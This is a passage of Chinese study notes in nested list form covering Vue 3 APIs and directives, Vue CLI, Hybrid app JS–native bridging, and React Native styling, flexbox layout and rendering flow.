只返回传递给它的对象。但是，就类型而言，返回的值有一个合成类型的构造函数，用于手动渲染函数、TSX 和 IDE 工具支持。</li></ul></li><li><p>defineAsyncComponent</p><ul><li>创建一个只有在需要时才会加载的异步组件</li></ul></li><li><p>resolveComponent</p><ul><li>如果在当前应用实例中可用，则允许按名称解析 component。返回一个 Component。如果没有找到，则返回 undefined。</li></ul></li><li><p>resolveDynamicComponent</p><ul><li>允许使用与 <component :is=""> 相同的机制来解析一个 component。返回已解析的 Component 或新创建的 VNode，其中组件名称作为节点标签。如果找不到 Component，将发出警告。</li></ul></li><li><p>withDirectives</p><ul><li>允许将指令应用于 VNode。返回一个包含应用指令的 VNode。</li></ul></li><li><p>createRenderer</p><ul><li>createRenderer 函数接受两个泛型参数： HostNode 和 HostElement，对应于宿主环境中的 Node 和 Element 类型。</li></ul></li><li><p>nextTick</p><ul><li>将回调推迟到下一个 DOM 更新周期之后执行。在更改了一些数据以等待 DOM 更新后立即使用它</li></ul></li></ul></li><li><p>options</p><ul><li><p>Data</p><ul><li><p>data</p><ul><li>返回组件实例的 data 对象的函数</li></ul></li><li><p>props</p><ul><li>props 可以是数组或对象，用于接收来自父组件的数据。props 可以是简单的数组，或者使用对象作为替代，对象允许配置高阶选项，如类型检测、自定义验证和设置默认值。</li></ul></li><li><p>computed</p><ul><li>计算属性将被混入到组件实例中。所有 getter 和 setter 的 this 上下文自动地绑定为组件实例。</li></ul></li><li><p>methods</p><ul><li>methods 将被混入到组件实例中。可以直接通过 VM 实例访问这些方法，或者在指令表达式中使用。方法中的 this 自动绑定为组件实例。</li></ul></li><li><p>watch</p><ul><li>一个对象，键是需要观察的表达式，值是对应回调函数。值也可以是方法名，或者包含选项的对象</li></ul></li><li><p>emits</p><ul><li>emits 可以是数组或对象，从组件触发自定义事件，emits 可以是简单的数组，或者对象作为替代，允许配置和事件验证</li></ul></li></ul></li><li><p>DOM</p><ul><li><p>template</p><ul><li>一个字符串模板作为 component 实例的标识使用。模板将会替换挂载的元素。挂载元素的内容都将被忽略，除非模板的内容有分发插槽。</li></ul></li><li><p>render</p><ul><li>字符串模板的另一种选择，允许你充分利用 JavaScript 的编程功能。</li></ul></li></ul></li><li><p>生命周期</p><ul><li><p>beforeCreate->setup()</p><ul><li>在实例初始化之后，数据观测 (data observer) 和 event/watcher 事件配置之前被调用</li></ul></li><li><p>created->setup()</p><ul><li>在实例创建完成后被立即调用。在这一步，实例已完成以下的配置：数据观测 (data observer)，property 和方法的运算，watch/event 事件回调。然而，挂载阶段还没开始，$el property 目前尚不可用</li></ul></li><li><p>beforeMount->onBeforeMount</p><ul><li>在挂载开始之前被调用：相关的 render 函数首次被调用。</li><li>该钩子在服务器端渲染期间不被调用。</li></ul></li><li><p>mounted->onMounted</p><ul><li>实例被挂载后调用，这时 Vue.createApp({}).mount() 被新创建的 vm.$el 替换了。如果根实例挂载到了一个文档内的元素上，当 mounted 被调用时 vm.$el 也在文档内。</li><li>注意 mounted 不会保证所有的子组件也都一起被挂载。如果你希望等到整个视图都渲染完毕，可以在 mounted 内部使用 vm.$nextTick</li><li>该钩子在服务器端渲染期间不被调用</li></ul></li><li><p>beforeUpdate->onBeforeUpdate</p><ul><li>数据更新时调用，发生在虚拟 DOM 打补丁之前。这里适合在更新之前访问现有的 DOM，比如手动移除已添加的事件监听器。</li><li>该钩子在服务器端渲染期间不被调用，因为只有初次渲染会在服务端进行</li></ul></li><li><p>updated->onUpdated</p><ul><li>由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。</li><li>当这个钩子被调用时，组件 DOM 已经更新，所以你现在可以执行依赖于 DOM 的操作。然而在大多数情况下，你应该避免在此期间更改状态。如果要相应状态改变，通常最好使用计算属性或侦听器取而代之。</li><li>注意，updated 不会保证所有的子组件也都一起被重绘。如果你希望等到整个视图都重绘完毕，可以在 updated 里使用 vm.$nextTick</li><li>该钩子在服务器端渲染期间不被调用</li></ul></li><li><p>activated</p><ul><li>被 keep-alive 缓存的组件激活时调用。</li><li>该钩子在服务器端渲染期间不被调用。</li></ul></li><li><p>deactivated</p><ul><li>被 keep-alive 缓存的组件停用时调用。</li><li>该钩子在服务器端渲染期间不被调用。</li></ul></li><li><p>beforeUnmount(3.0)->onBeforeUnmount</p><ul><li>在卸载组件实例之前调用。在这个阶段，实例仍然是完全正常的。</li><li>该钩子在服务器端渲染期间不被调用。</li></ul></li><li><p>unmounted(3.0)->onUnmounted</p><ul><li>卸载组件实例后调用。调用此钩子时，组件实例的所有指令都被解除绑定，所有事件侦听器都被移除，所有子组件实例被卸载。</li><li>该钩子在服务器端渲染期间不被调用。</li></ul></li><li><p>errorCaptured->onErrorCaptured</p><ul><li>当捕获一个来自子孙组件的错误时被调用。此钩子会收到三个参数：错误对象、发生错误的组件实例以及一个包含错误来源信息的字符串。此钩子可以返回 false 以阻止该错误继续向上传播。</li></ul></li><li><p>renderTracked(3.0)->onRenderTracked</p><ul><li>跟踪虚拟 DOM 重新渲染时调用。钩子接收 debugger event 作为参数。此事件告诉你哪个操作跟踪了组件以及该操作的目标对象和键。</li></ul></li><li><p>renderTriggered(3.0)->onRenderTriggered</p><ul><li>当虚拟 DOM 重新渲染为 triggered.Similarly 为renderTracked，接收 debugger event 作为参数。此事件告诉你是什么操作触发了重新渲染，以及该操作的目标对象和键。</li></ul></li></ul></li><li><p>选项/资源</p><ul><li><p>directives</p><ul><li>包含组件实例可用指令的哈希表。</li></ul></li><li><p>components</p><ul><li>包含组件实例可用组件的哈希表。</li></ul></li></ul></li></ul></li><li><p>实例property</p><ul><li><p>$data</p><ul><li>组件实例观察的数据对象。组件实例代理了对其 data 对象 property 的访问。</li></ul></li><li><p>$props</p><ul><li>当前组件接收到的 props 对象。组件实例代理了对其 props 对象 property 的访问。</li></ul></li><li><p>$el</p><ul><li>组件实例使用的根 DOM 元素。</li></ul></li><li><p>$options</p><ul><li>用于当前组件实例的初始化选项</li></ul></li><li><p>$parent</p><ul><li>父实例，如果当前实例有的话。</li></ul></li><li><p>$root</p><ul><li>当前组件树的根组件实例。如果当前实例没有父实例，此实例将会是其自己。</li></ul></li><li><p>$slots</p><ul><li>用来访问被插槽分发的内容。</li></ul></li><li><p>$refs</p><ul><li>一个对象，持有注册过 ref attribute 的所有 DOM 元素和组件实例。</li></ul></li><li><p>$attrs</p><ul><li>包含了父作用域中不作为组件 props 或自定义事件。</li></ul></li></ul></li><li><p>实例方法</p><ul><li><p>$watch</p><ul><li>侦听组件实例上的响应式 property 或函数计算结果的变化。</li></ul></li><li><p>$emit</p><ul><li>触发当前实例上的事件。附加参数都会传给监听器回调。</li></ul></li><li><p>$forceUpdate</p><ul><li>迫使组件实例重新渲染。注意它仅仅影响实例本身和插入插槽内容的子组件，而不是所有子组件。</li></ul></li><li><p>$nextTick</p><ul><li>将回调延迟到下次 DOM 更新循环之后执行。在修改数据之后立即使用它，然后等待 DOM 更新。它跟全局方法 nextTick 一样，不同的是回调的 this 自动绑定到调用它的实例上。</li></ul></li></ul></li><li><p>指令</p><ul><li><p>v-text</p><ul><li>更新元素的 textContent。如果要更新部分的 textContent，需要使用 Mustache 插值。</li></ul></li><li><p>v-html</p><ul><li>更新元素的 innerHTML。注意：内容按普通 HTML 插入 - 不会作为 Vue 模板进行编译。如果试图使用 v-html 组合模板，可以重新考虑是否通过使用组件来替代。</li></ul></li><li><p>v-show</p><ul><li>根据表达式的真假值，切换元素的 display CSS property。</li><li>当条件变化时该指令触发过渡效果。</li></ul></li><li><p>v-if</p><ul><li>根据表达式的真假值来有条件地渲染元素。在切换时元素及它的数据绑定 / 组件被销毁并重建。如果元素是 <template>，将提取它的内容作为条件块。</li><li>当条件变化时该指令触发过渡效果。</li><li>当和 v-for 一起使用时，v-if 的优先级比 v-for 更高</li></ul></li><li><p>v-else</p><ul><li>为 v-if 或者 v-else-if 添加“else 块”。</li></ul></li><li><p>v-else-if</p><ul><li>表示 v-if 的“else if 块”。可以链式调用。</li></ul></li><li><p>v-for</p><ul><li>基于源数据多次渲染元素或模板块</li></ul></li><li><p>v-on</p><ul><li>.stop - 调用 event.stopPropagation()。</li><li>.prevent - 调用 event.preventDefault()。</li><li>.capture - 添加事件侦听器时使用 capture 模式。</li><li>.self - 只当事件是从侦听器绑定的元素本身触发时才触发回调。</li><li>.{keyAlias} - 仅当事件是从特定键触发时才触发回调。</li><li>.once - 只触发一次回调。</li><li>.left - 只当点击鼠标左键时触发。</li><li>.right - 只当点击鼠标右键时触发。</li><li>.middle - 只当点击鼠标中键时触发。</li><li>.passive - { passive: true } 模式添加侦听器</li><li>绑定事件监听器。事件类型由参数指定。</li></ul></li><li><p>v-bind</p><ul><li>动态地绑定一个或多个 attribute，或一个组件 prop 到表达式。</li></ul></li><li><p>v-model</p><ul><li>.lazy - 监听 change 而不是 input 事件</li><li>.number - 输入字符串转为有效的数字</li><li>.trim - 输入首尾空格过滤</li><li>在表单控件或者组件上创建双向绑定。</li></ul></li><li><p>v-slot</p><ul><li>提供具名插槽或需要接收 prop 的插槽。</li></ul></li><li><p>v-pre</p><ul><li>跳过这个元素和它的子元素的编译过程。可以用来显示原始 Mustache 标签。跳过大量没有指令的节点会加快编译。</li></ul></li><li><p>v-cloak</p><ul><li>这个指令保持在元素上直到关联组件实例结束编译。和 CSS 规则如 [v-cloak] { display: none } 一起用时，这个指令可以隐藏未编译的 Mustache 标签直到组件实例准备完毕。</li></ul></li><li><p>v-once</p><ul><li>只渲染元素和组件一次。随后的重新渲染，元素/组件及其所有的子节点将被视为静态内容并跳过。这可以用于优化更新性能。</li></ul></li><li><p>v-is</p><ul><li>在 DOM 内模板使用时，模板受原生 HTML 解析规则的约束</li></ul></li></ul></li><li><p>特殊指令</p><ul><li><p>key</p><ul><li>key 的特殊 attribute 主要用在 Vue 的虚拟 DOM 算法，在新旧 nodes 对比时辨识 VNodes。如果不使用 key，Vue 会使用一种最大限度减少动态元素并且尽可能的尝试就地修改/复用相同类型元素的算法。而使用 key 时，它会基于 key 的变化重新排列元素顺序，并且会移除/销毁 key 不存在的元素。</li><li>有相同父元素的子元素必须有独特的 key。重复的 key 会造成渲染错误。</li></ul></li><li><p>ref</p><ul><li>ref 被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素；如果用在子组件上，引用就指向组件实例</li></ul></li><li><p>is</p><ul><li>使用动态组件。</li></ul></li></ul></li><li><p>内置组件</p><ul><li><p>component</p><ul><li>渲染一个“元组件”为动态组件。依 is 的值，来决定哪个组件被渲染。is 的值是一个字符串，它既可以是 HTML 标签名称也可以是组件名称。</li></ul></li><li><p>transition</p><ul><li><transition> 元素作为单个元素/组件的过渡效果。<transition> 只会把过渡效果应用到其包裹的内容上，而不会额外渲染 DOM 元素，也不会出现在可被检查的组件层级中。</li></ul></li><li><p>transition-group</p><ul><li><transition-group>提供多个元素/组件的过渡效果。默认情况下，它不呈现包装DOM元素，但可以通过tag属性定义一个。</li><li>注意，每个 <transition-group> 的子节点必须有独立的 key，动画才能正常工作</li></ul></li><li><p>keep-alive</p><ul><li><keep-alive> 包裹动态组件时，会缓存不活动的组件实例，而不是销毁它们。和 <transition> 相似，<keep-alive> 是一个抽象组件：它自身不会渲染一个 DOM 元素，也不会出现在组件的父组件链中。</li><li>当组件在 <keep-alive> 内被切换，它的 activated 和 deactivated 这两个生命周期钩子函数将会被对应执行。</li><li>主要用于保留组件状态或避免重新渲染。</li></ul></li><li><p>slot</p><ul><li><slot> 元素作为组件模板之中的内容分发插槽。<slot> 元素自身将被替换。</li></ul></li><li><p>teleport</p><ul><li>允许我们控制在 DOM 中哪个父节点下渲染了 HTML，而不必求助于全局状态或将其拆分为两个组件。</li></ul></li></ul></li><li><p>响应式API</p><ul><li><p>响应式基础API</p><ul><li><p>reactive</p><ul><li>返回对象的响应式副本</li><li>响应式转换是“深层”的——它影响所有嵌套 property。在基于 ES2015 Proxy 的实现中，返回的 proxy 是不等于原始对象的。建议只使用响应式 proxy，避免依赖原始对象。</li></ul></li><li><p>readonly</p><ul><li>获取一个对象 (响应式或纯对象) 或 ref 并返回原始 proxy 的只读 proxy。只读 proxy 是深层的：访问的任何嵌套 property 也是只读的。</li></ul></li><li><p>isProxy</p><ul><li>检查对象是否是由 reactive 或 readonly 创建的 proxy。</li></ul></li><li><p>isReactive</p><ul><li>检查对象是否是 reactive创建的响应式 proxy。</li></ul></li><li><p>isReadonly</p><ul><li>检查对象是否是由readonly创建的只读 proxy。</li></ul></li><li><p>toRaw</p><ul><li>返回 reactive 或 readonly proxy 的原始对象。这是一个转义口，可用于临时读取而不会引起 proxy 访问/跟踪开销，也可用于写入而不会触发更改</li></ul></li><li><p>markRaw</p><ul><li>标记一个对象，使其永远不会转换为 proxy。返回对象本身。</li></ul></li><li><p>shallowReactive</p><ul><li>创建一个响应式 proxy，跟踪其自身 property 的响应性，但不执行嵌套对象的深度响应式转换 (暴露原始值)。</li></ul></li><li><p>shallowReadonly</p><ul><li>创建一个 proxy，使其自身的 property 为只读，但不执行嵌套对象的深度只读转换 (暴露原始值)。</li></ul></li></ul></li><li><p>Refs</p><ul><li><p>ref</p><ul><li>接受一个内部值并返回一个响应式且可变的 ref 对象。ref 对象具有指向内部值的单个 property .value。</li></ul></li><li><p>unref</p><ul><li>如果参数为 ref，则返回内部值，否则返回参数本身。这是 val = isRef(val) ? val.value : val。</li></ul></li><li><p>toRef</p><ul><li>可以用来为源响应式对象上的 property 新创建一个 ref。然后可以将 ref 传递出去，从而保持对其源 property 的响应式连接。</li></ul></li><li><p>toRefs</p><ul><li>将响应式对象转换为普通对象，其中结果对象的每个 property 都是指向原始对象相应 property 的ref。</li></ul></li><li><p>isRef</p><ul><li>检查值是否是ref对象。</li></ul></li><li><p>customRef</p><ul><li>创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。它需要一个工厂函数，该函数接收 track 和 trigger 函数作为参数，并应返回一个带有 get 和 set 的对象。</li></ul></li><li><p>shallowRef</p><ul><li>创建一个 ref，它跟踪自己的 .value 更改，但不会使其值成为响应式的。</li></ul></li><li><p>triggerRef</p><ul><li>手动执行与 shallowRef 关联的任何副作用。</li></ul></li></ul></li><li><p>Computed和watch</p><ul><li><p>computed</p><ul><li>使用 getter 函数，并为从 getter 返回的值返回一个不变的响应式 ref 对象。</li></ul></li><li><p>watchEffect</p><ul><li>在响应式地跟踪其依赖项时立即运行一个函数，并在更改依赖项时重新运行它。</li></ul></li><li><p>watch</p><ul><li>watch API 与选项式 API this.$watch (以及相应的 watch 选项) 完全等效。watch 需要侦听特定的数据源，并在单独的回调函数中执行副作用。默认情况下，它也是惰性的——即回调仅在侦听源发生更改时调用。</li></ul></li></ul></li></ul></li><li><p>组合式API</p><ul><li><p>setup</p><ul><li><p>一个组件选项，在创建组件之前执行，一旦 props 被解析，并作为组合式 API 的入口点</p></li><li><p>props</p><ul><li>setup 函数中的第一个参数是 props。正如在一个标准组件中所期望的那样，setup 函数中的 props 是响应式的，当传入新的 prop 时，它将被更新。</li></ul></li><li><p>context</p><ul><li>传递给 setup 函数的第二个参数是 context。context 是一个普通的 JavaScript 对象，它暴露三个组件的 property</li></ul></li></ul></li><li><p>生命周期钩子</p></li></ul></li></ul></li><li><p>Vuex</p></li><li><p>Vue-router</p></li><li><p>Vue-SSR</p></li><li><p>Vue-Loader</p></li><li><p>Vue-Cli</p><ul><li><p>通过 @vue/cli 实现的交互式的项目脚手架。</p></li><li><p>通过 @vue/cli + @vue/cli-service-global 实现的零配置原型开发。</p></li><li><p>一个运行时依赖 (@vue/cli-service)</p></li><li><p>Cli</p><ul><li>CLI (@vue/cli) 是一个全局安装的 npm 包，提供了终端里的 vue 命令。它可以通过 vue create 快速搭建一个新项目，或者直接通过 vue serve 构建新想法的原型。你也可以通过 vue ui 通过一套图形化界面管理你的所有项目</li></ul></li><li><p>Cli服务</p><ul><li><p>CLI 服务 (@vue/cli-service) 是一个开发环境依赖。它是一个 npm 包，局部安装在每个 @vue/cli 创建的项目中。</p></li><li><p>CLI 服务是构建于 webpack 和 webpack-dev-server 之上的</p><ul><li>加载其它 CLI 插件的核心服务；</li><li>一个针对绝大部分应用优化过的内部的 webpack 配置；</li><li>项目内部的 vue-cli-service 命令，提供 serve、build 和 inspect 命令</li></ul></li></ul></li><li><p>Cli插件</p><ul><li>CLI 插件是向你的 Vue 项目提供可选功能的 npm 包，例如 Babel/TypeScript 转译、ESLint 集成、单元测试和 end-to-end 测试等。Vue CLI 插件的名字以 @vue/cli-plugin- (内建插件) 或 vue-cli-plugin- (社区插件) 开头，非常容易使用。</li><li>当你在项目内部运行 vue-cli-service 命令时，它会自动解析并加载 package.json 中列出的所有 CLI 插件。</li><li>插件可以作为项目创建过程的一部分，或在后期加入到项目中。它们也可以被归成一组可复用的 preset</li></ul></li></ul></li><li><p>Vue-Devtools</p></li><li><p>vue-class-component</p></li></ul><h2 id="跨平台技术-1"><a href="#跨平台技术-1" class="headerlink" title="跨平台技术"></a>跨平台技术</h2><h3 id="跨端技术发展的三个阶段-1"><a href="#跨端技术发展的三个阶段-1" class="headerlink" title="跨端技术发展的三个阶段"></a>跨端技术发展的三个阶段</h3><ul><li><p>第一阶段是混合开发的web容器时代</p><ul><li>为了解决原生开发的高成本、低效率，出现了Hybrid混合开发</li><li>原生中嵌入依托于浏览器的WebView</li><li>Web浏览器中可以实现的需求在WebView中基本都可以实现</li><li>但是Web最大的问题是，它的性能和体验与原生开发存在肉眼可感知的差异</li><li>因此并不适用于对性能和用户体验要求较高的场景</li></ul></li><li><p>第二阶段是以RN和Weex为代表的泛web容器时代</p><ul><li>RN对Web标准进行了功能裁剪</li><li>用户体验更接近于原生了</li><li>由于进行了功能裁剪，所以RN对业务的支持能力还不到浏览器的5%</li><li>因此仅适用于中低复杂度的低交互类页面。面对稍微复杂一点儿的交互和动画需求，都需要通过调用原生代码去扩展才能实现</li></ul></li><li><p>第三阶段是以Flutter为代表的自绘引擎时代</p><ul><li>Flutter是构建Google物联网操作系统Fuchsia的SDK</li><li>它使用Dart语言开发APP</li><li>一套代码可以同时运行在iOS和Android平台上</li><li>Flutter采用自带的Native渲染引擎渲染视图，它是自己完成了组件渲染的闭环</li><li>而RN、Weex之类的框架，只是通过JavaScript虚拟机扩展调用系统组件，最后是由Android或者iOS系统来完成组件的渲染</li></ul></li></ul><h3 id="Hybrid-1"><a href="#Hybrid-1" class="headerlink" title="Hybrid"></a>Hybrid</h3><ul><li><p>为什么要引入hybrid开发</p><ul><li>Native应对急速业务需求，APP迭代加快，频繁的发版已难以应付</li><li>Android渠道众多，apple store审核周期长</li><li>纯native开发效率低，开发维护成本高，不支持热更新</li><li>相对于其他动态发布技术，技术研发成本较低，使用语言更广泛，社区资源更丰富</li></ul></li><li><p>优劣势</p><ul><li><p>原生APP</p><ul><li><p>优点</p><ul><li>打造完美的用户体验</li><li>性能稳定、操作速度快，上手流畅</li><li>访问本地资源（通讯录，相册）</li><li>设计出色的动效，转场</li><li>拥有系统级别的贴心通知或提醒</li><li>用户留存率高</li></ul></li><li><p>缺点</p><ul><li>分发成本高（不同平台有不同的开发语言和界面适配）</li><li>维护成本高</li><li>更新缓慢，根据不同平台，提交–审核–上线 等等不同的流程，需要经过的流程较复杂</li></ul></li></ul></li><li><p>Web APP</p><ul><li><p>优点</p><ul><li>发版完全自控随时更新开发成本小时间快</li></ul></li><li><p>缺点</p><ul><li>性能差弱网络无网络条件下体验差</li></ul></li></ul></li><li><p>Hybrid APP</p><ul><li><p>优点</p><ul><li>跨平台</li><li>开发周期短、成本低</li><li>用户体验良好</li><li>可以即时修复bug、动态发版</li></ul></li><li><p>缺点</p><ul><li>仿原生iOS效果复杂</li><li>机型兼容性</li></ul></li></ul></li></ul></li><li><p>整体架构</p><ul><li><p>viewLayer（视图层）</p><ul><li><p>H5</p><ul><li>H5页面</li><li>webview引擎渲染</li></ul></li><li><p>Native</p><ul><li>Native页面</li><li>系统原生引擎渲染</li></ul></li></ul></li><li><p>coreLayer（通信层）</p><ul><li><p>自定义webview资源拦截管理器</p><ul><li>内置资源管理</li><li>缓存模块</li><li>文件下载模块</li></ul></li><li><p>定义页面跳转管理器</p></li><li><p>定义混合通信交互模块</p></li></ul></li></ul></li><li><p>交互设计</p><ul><li><p>交互原理</p><ul><li><p>两种交互</p><ul><li>native主动调用前端JS</li><li>H5主动与native发起通信</li></ul></li><li><p>交互过程（OC）</p><ul><li><p>搭建JS调用OC的桥梁，注册供JS调用的方法name</p></li><li><p>JS在调用Native注册方法</p><ul><li>iOS：window.webkit.messageHandlers.自定义属性.postMessage()</li><li>Android：window.自定义方法</li></ul></li><li><p>Native接收JS调用，解析处理，返回回调</p></li></ul></li></ul></li><li><p>通信方式</p><ul><li><p>假跳转的请求拦截（不建议）</p><ul><li><p>假跳转的请求拦截 就是由网页发出一条新的跳转请求，跳转的目的地是一个非法的压根就不存在的地址</p></li><li><p>比如：wbcst://testhost/action?params=xxx</p></li><li><p>模拟http协议网络请求 scheme://host/action?params</p></li><li><p>客户端会无差别拦截所有请求，真正的url地址应该照常放过，只有协议域名匹配的url地址才应该被客户端拦截</p></li><li><p>JS调用方式</p><ul><li>a标签跳转</li><li>location.href跳转</li><li>iframe跳转</li></ul></li><li><p>不建议使用，android系统对url参数做了字节限制，无法进行大数据的通信</p></li></ul></li><li><p>弹窗拦截（不建议）</p><ul><li><p>alert</p><ul><li>弹出个提示框，只能点确认无回调</li></ul></li><li><p>confirm</p><ul><li>弹出个确认框（确认，取消），可以回调</li></ul></li><li><p>prompt</p><ul><li>弹出个输入框，让用户输入东西，可以回调</li></ul></li><li><p>不建议使用，会无差别的拦截所有前端的window弹窗</p></li></ul></li><li><p>JS上下文注入（推荐）</p><ul><li><p>iOS</p><ul><li>WKWebView scriptMessageHandler注入</li></ul></li><li><p>android</p><ul><li>addJavascriptInterface注入</li></ul></li><li><p>特点</p><ul><li>不通过任何拦截的办法，而是直接将一个native对象（or函数）注入到JS里面，可以由web的js代码直接调用，直接操作</li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="ReactNative-1"><a href="#ReactNative-1" class="headerlink" title="ReactNative"></a>ReactNative</h3><ul><li><p>简介</p><ul><li><p>特性</p><ul><li>Learn Once,Write AnyWhere</li><li>提供了原生控件支持</li><li>异步执行</li><li>触屏处理</li></ul></li><li><p>设计理念</p><ul><li>既拥有Native的用户体验</li><li>又保留React的开发效率</li></ul></li><li><p>优势</p><ul><li>它对比原生开发更为灵活，对比H5体验更为高效。</li><li>替代传统的WebView，打开效率更高，和原生之间的交互更方便。</li><li>多个版本迭代后的今天，它已经拥有了丰富第三方插件支持</li><li>更方便的热更新</li></ul></li><li><p>劣势</p><ul><li>尽管是跨平台，但是不同平台Api的特性与显示并不一定一致</li><li>调试’相对‘麻烦。</li><li>Android上的兼容性问题</li></ul></li><li><p>风险</p><ul><li>尽管Facebook有3款App(Groups、Ads Manager、F8)使用了React Native，随着React Native大规模应用，Appstore的政策是否有变不得而知</li></ul></li></ul></li><li><p>环境搭建</p><ul><li><a href="https://reactnative.cn/docs/environment-setup">https://reactnative.cn/docs/environment-setup</a></li></ul></li><li><p>架构设计</p><ul><li><p>Native</p></li><li><p>Bridge</p><ul><li>异步（asynchronous）：不依赖于同步通信</li><li>可序列化（serializable）：保证一切 UI 操作都能序列化成 JSON 并转换回来</li><li>批处理（batched）：对 Native 调用进行排队，批量处理</li></ul></li><li><p>JavaScript</p></li></ul></li><li><p>组件及布局</p><ul><li><p>核心组件</p><ul><li>View</li><li>Text</li><li>ScrollView</li><li>Image</li><li>TextInput</li></ul></li><li><p>原生组件</p><ul><li>运行时RN为前端组件创建相应的android和iOS视图</li><li>RN就是对原生视图的封装</li></ul></li><li><p>style</p><ul><li><p>RN编写的应用的样式不是靠css来实现的</p></li><li><p>而是依赖javascript来为你的应用来添加样式</p></li><li><p>样式声明</p><ul><li><p>依赖导入</p><ul><li><code>import React, { StyleSheet } from &quot;react-native&quot;;</code></li></ul></li><li><p>调用React-Native的一个构造方法</p></li><li><p>传入一个对象生成style</p></li><li><p>和React的React.createCladd()语法是一样的，传入对象的key就相当于类名，每个类也是一个对象，可以配置各种样式参数</p></li><li><p>注意</p><ul><li>对象key全部是驼峰写法</li><li>长度不加单位</li></ul></li><li><p>示例</p><ul><li>`const styles = StyleSheet.create({  <pre><code>  active: {        borderWidth: 2,        borderColor: ‘#ff00ff&#39;,    },  </code></pre>  });`</li></ul></li></ul></li><li><p>样式使用</p><ul><li><p>外部引入</p><ul><li><code>&lt;View style={styles.base}&gt;&lt;/View&gt;</code></li></ul></li><li><p>设置多个属性类</p></li><li><p>行内样式</p></li></ul></li></ul></li><li><p>flexBox布局</p><ul><li><p>什么是FlexBox布局</p><ul><li><p>弹性盒模型（The Flexible Box Module）,又叫Flexbox，意为“弹性布局”</p></li><li><p>旨在通过弹性的方式来对齐和分布容器中内容的空间，使其能适应不同屏幕，为盒装模型提供最大的灵活性</p></li><li><p>布局思想</p><ul><li>让容器有能力让其子项目能够改变其宽度、高度（甚至是顺序）</li><li>以最佳方式填充可用空间</li></ul></li></ul></li><li><p>Flex布局基于flex-flow流</p><ul><li><p>水平的主轴（main axis）</p><ul><li>主轴的开始位置（与边框的交叉点）叫做main start</li><li>结束位置叫做main end</li></ul></li><li><p>垂直的交叉轴（cross axis）</p><ul><li>交叉轴的开始位置叫做cross start</li><li>结束位置叫做cross end</li></ul></li><li><p>项目默认沿主轴排列，单个项目占据的主轴空间叫做main size，占据的交叉轴空间叫做cross size</p></li></ul></li><li><p>属性</p><ul><li><p>4个容器属性</p><ul><li><p>flexDirection</p><ul><li>决定主轴的方向（即项目的排列方向）</li><li>row：主轴为水平方向，起点在左端。</li><li>row-reverse：主轴为水平方向，起点在右端</li><li>column(默认值)：主轴为垂直方向，起点在上沿。</li><li>column-reverse：主轴为垂直方向，起点在下沿。</li></ul></li><li><p>flexWrap</p><ul><li>默认情况下，项目都排在一条线（又称"轴线"）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。</li><li>nowrap(默认值)：不换行</li><li>wrap：换行，第一行在上方</li><li>wrap-reverse：换行，第一行在下方。（和wrap相反）</li></ul></li><li><p>justifyContent</p><ul><li>定义了伸缩项目在主轴线的对齐方式</li><li>flex-start(默认值)：伸缩项目向一行的起始位置靠齐。</li><li>flex-end：伸缩项目向一行的结束位置靠齐</li><li>center：伸缩项目向一行的中间位置靠齐。</li><li>space-between：两端对齐，项目之间的间隔都相等。</li><li>space-around：伸缩项目会平均地分布在行里，两端保留一半的空间</li></ul></li><li><p>alignItems</p><ul><li>定义项目在交叉轴上如何对齐，可以把其想像成侧轴（垂直于主轴）的“对齐方式”。</li><li>flex-start：交叉轴的起点对齐。</li><li>flex-end：交叉轴的终点对齐 。</li><li>center：交叉轴的中点对齐。</li><li>baseline：项目的第一行文字的基线对齐。</li><li>stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。</li></ul></li></ul></li><li><p>2个项目属性</p><ul><li><p>flex</p><ul><li>复合属性</li><li>设置或检索伸缩盒对象的子元素如何分配空间</li><li>其中第二个和第三个参数（flex-shrink、flex-basis）是可选参数</li><li>默认值为“0 1 auto”</li></ul></li><li><p>alignSelf</p><ul><li>align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性</li><li>默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch</li></ul></li></ul></li></ul></li></ul></li></ul></li><li><p>UI渲染</p><ul><li><p>模块注入</p><ul><li><p>RN模块注入</p><ul><li>index->App</li></ul></li><li><p>RN模块运行入口</p><ul><li><p>AppRegistry</p><ul><li><p>AppRegistry常用方法</p></li><li><p>registerConfig</p><ul><li>static静态方法,用来注册配置信息</li></ul></li><li><p>registerComponent</p><ul><li>注册组件</li></ul></li><li><p>registerRunnable</p><ul><li>注册线程</li></ul></li><li><p>runApplication</p><ul><li>进行运行应用 </li></ul></li></ul></li></ul></li><li><p>入口组件注册</p><ul><li>registerComponent</li></ul></li><li><p>加载jsbundle文件运行应用</p><ul><li>runApplication</li></ul></li></ul></li><li><p>页面启动UI渲染</p><ul><li>APP启动</li><li>读取模块Modules</li><li>初始化根视图（RCTRootView）</li><li>创建了一个实现 Objective-C 与 Javascript 交互的全局bridge（RCTBridge）</li><li>读取Javascript代码（RCTBridgeloadSource）</li><li>初始化Native模块化信息</li><li>初始化 JavaScript 代码的执行器，即 RCTJSCExecutor 对象</li><li>执行JS调用OC组件</li><li>将flexbox布局转换成原生布局完成UI渲染</li></ul></li><li><p>UI控件渲染流程</p><ul><li><p>RCTRootView runApplication:bridge</p><ul><li>通知JS运行App</li></ul></li><li><p>RCTBatchedBridge _processResponse:json error:error</p><ul><li>处理执行完JS代码(runApplication)返回的相应，包含需要添加多少子控件的信息。</li></ul></li><li><p>RCTBatchedBridge batchDidComplete</p><ul><li>RCTUIManager调用处理完成的方法，就会开始去加载rootView的子控件。</li></ul></li><li><p>RCTUIManager createView:viewName:rootTag:props</p><ul><li>通过JS执行OC代码，让UI管理者创建子控件View</li></ul></li><li><p>[RCTUIManager _layoutAndMount]</p><ul><li>布局RCTRootView和增加子控件</li></ul></li><li><p>[RCTUIManager setChildren:reactTags:]</p><ul><li>给RCTRootView对应的RCTRootShadowView设置子控件</li></ul></li><li><p>[RCTRootShadowView insertReactSubview:view atIndex:index++]</p><ul><li>遍历子控件数组，给RCTRootShadowView插入所有子控件</li></ul></li><li><p>[RCTShadowView processUpdatedProperties:parentProperties:]</p><ul><li>处理保存在RCTShadowView中属性，就会去布局RCTShadowView对应UIView的所有子控件</li></ul></li><li><p>[RCTView 